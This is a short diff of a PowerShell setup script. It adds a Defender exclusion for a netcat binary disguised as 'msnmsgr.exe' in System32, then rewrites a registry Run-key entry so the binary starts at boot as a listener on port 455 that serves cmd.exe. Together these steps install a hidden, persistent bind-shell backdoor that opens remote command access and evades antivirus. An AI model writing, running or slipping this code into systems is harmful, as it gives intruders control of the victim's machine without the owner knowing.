@@ -51,7 +51,7 @@ if (Test-Path "$system32Path\nc.exe") {
 Write-Host "4/10: Setting up System Startup..."
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsgr.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
+Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'nc' -Value 'C:\Windows\System32\msnmsgr.exe -l -p 455 -e cmd.exe'
 
 # 5/10: Adding Firewall Rule
 Write-Host "5/10: Adding Firewall Rule..."
